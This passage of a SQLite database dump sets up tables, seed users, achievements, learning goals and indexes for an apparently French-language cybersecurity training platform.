    slug TEXT NOT NULL UNIQUE,
    name TEXT NOT NULL,
    description TEXT,
    domain TEXT NOT NULL,
    created_at TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now'))
);
CREATE TABLE user_achievements (
    user_id TEXT NOT NULL,
    achievement_id TEXT NOT NULL,
    earned_at TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')),
    PRIMARY KEY (user_id, achievement_id),
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
    FOREIGN KEY (achievement_id) REFERENCES achievements(id) ON DELETE CASCADE
);
INSERT INTO "user_achievements" VALUES('user_alex_learner','ach_first_blood','2026-10-02 10:30:00');
INSERT INTO "user_achievements" VALUES('user_founder_raylab','ach_first_blood','2026-09-02 09:00:00');
INSERT INTO "user_achievements" VALUES('user_founder_raylab','ach_bash_master','2026-09-10 14:00:00');
INSERT INTO "user_achievements" VALUES('user_founder_raylab','ach_scapy_forger','2026-09-20 16:30:00');
INSERT INTO "user_achievements" VALUES('user_founder_raylab','ach_capstone_hero','2026-10-01 18:00:00');
CREATE TABLE user_certifications (
    id TEXT PRIMARY KEY,
    user_id TEXT NOT NULL,
    certification_id TEXT NOT NULL,
    achievement_status TEXT NOT NULL DEFAULT 'planned'
        CHECK (achievement_status IN ('planned', 'studying', 'earned', 'expired')),
    earned_at TEXT,
    expires_at TEXT,
    credential_url TEXT,
    notes TEXT,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
    FOREIGN KEY (certification_id) REFERENCES certifications(id) ON DELETE RESTRICT
);
CREATE TABLE user_goals (
    id TEXT PRIMARY KEY,
    user_id TEXT NOT NULL,
    title TEXT NOT NULL,
    description TEXT,
    goal_type TEXT NOT NULL DEFAULT 'learning'
        CHECK (goal_type IN ('learning', 'project', 'certification', 'career', 'other')),
    target_date TEXT,
    status TEXT NOT NULL DEFAULT 'active'
        CHECK (status IN ('active', 'completed', 'paused', 'cancelled')),
    is_private INTEGER NOT NULL DEFAULT 1 CHECK (is_private IN (0, 1)),
    created_at TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')),
    updated_at TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')),
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);
INSERT INTO "user_goals" VALUES('goal_alex_secplus','user_alex_learner','Obtenir la certification CompTIA Security+ (SY0-701)','Valider les 12 volumes CyberPath et réussir 10 examens blancs sur la plateforme.','certification','2026-12-15','active',1,'2026-11-04T20:51:45.839Z','2026-11-04T20:51:45.839Z');
INSERT INTO "user_goals" VALUES('goal_alex_oscp','user_alex_learner','Préparer l''examen pratique OSCP PEN-200','Résoudre au moins 30 machines sur des plateformes CTF et maîtriser les Reverse Shells Python.','certification','2027-04-30','active',1,'2026-11-04T20:51:45.839Z','2026-11-04T20:51:45.839Z');
CREATE TABLE user_notes (
    id TEXT PRIMARY KEY,
    user_id TEXT NOT NULL,
    lesson_id TEXT,
    title TEXT,
    body TEXT NOT NULL,
    is_private INTEGER NOT NULL DEFAULT 1 CHECK (is_private IN (0, 1)),
    created_at TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')),
    updated_at TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')),
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
    FOREIGN KEY (lesson_id) REFERENCES lessons(id) ON DELETE SET NULL
);
CREATE TABLE user_roles (
    user_id TEXT NOT NULL,
    role_id TEXT NOT NULL,
    assigned_at TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')),
    PRIMARY KEY (user_id, role_id),
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
    FOREIGN KEY (role_id) REFERENCES roles(id) ON DELETE RESTRICT
);
INSERT INTO "user_roles" VALUES('user_founder_raylab','role_super_admin','2026-11-04T20:51:45.835Z');
INSERT INTO "user_roles" VALUES('user_founder_raylab','role_editor','2026-11-04T20:51:45.835Z');
INSERT INTO "user_roles" VALUES('user_founder_raylab','role_learner','2026-11-04T20:51:45.835Z');
INSERT INTO "user_roles" VALUES('user_alex_learner','role_learner','2026-11-04T20:51:45.835Z');
CREATE TABLE users (
    id TEXT PRIMARY KEY,
    auth_subject TEXT NOT NULL UNIQUE,
    email TEXT NOT NULL COLLATE NOCASE UNIQUE,
    display_name TEXT NOT NULL,
    avatar_url TEXT,
    preferred_language TEXT NOT NULL DEFAULT 'fr',
    timezone TEXT NOT NULL DEFAULT 'Europe/Berlin',
    account_status TEXT NOT NULL DEFAULT 'active'
        CHECK (account_status IN ('active', 'suspended', 'deleted')),
    created_at TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')),
    updated_at TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now'))
);
INSERT INTO "users" VALUES('user_founder_raylab','auth_founder_001','founder@raylab.tech','Fondateur RayLab','https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150&auto=format&fit=crop&q=80','fr','Europe/Paris','active','2026-11-04T20:51:45.834Z','2026-11-04T20:51:45.834Z');
INSERT INTO "users" VALUES('user_alex_learner','auth_alex_002','alexandre@example.com','Alexandre Dubois','https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=150&auto=format&fit=crop&q=80','fr','Europe/Berlin','active','2026-11-04T20:51:45.835Z','2026-11-04T20:51:45.835Z');
CREATE INDEX idx_user_roles_role ON user_roles(role_id);
CREATE INDEX idx_courses_domain_status ON courses(domain, status);
CREATE INDEX idx_modules_course_position ON modules(course_id, position);
CREATE INDEX idx_lessons_module_position ON lessons(module_id, position);
CREATE INDEX idx_lesson_resources_lesson ON lesson_resources(lesson_id, position);
CREATE INDEX idx_path_courses_course ON path_courses(course_id);
CREATE INDEX idx_path_enrollments_user_status ON path_enrollments(user_id, status);
CREATE INDEX idx_lesson_progress_user_status ON lesson_progress(user_id, status);
CREATE INDEX idx_lesson_progress_lesson ON lesson_progress(lesson_id);
CREATE INDEX idx_user_notes_user_updated ON user_notes(user_id, updated_at);
CREATE INDEX idx_exercises_lesson ON exercises(lesson_id);
CREATE INDEX idx_exercise_attempts_user_date ON exercise_attempts(user_id, submitted_at);
CREATE INDEX idx_quiz_attempts_user_date ON quiz_attempts(user_id, submitted_at);
CREATE INDEX idx_projects_domain_status ON projects(domain, status);
CREATE INDEX idx_project_submissions_user_status ON project_submissions(user_id, status);
CREATE INDEX idx_user_certifications_user ON user_certifications(user_id);
CREATE INDEX idx_user_goals_user_status ON user_goals(user_id, status);
CREATE INDEX idx_activity_events_user_date ON activity_events(user_id, created_at);
COMMIT;
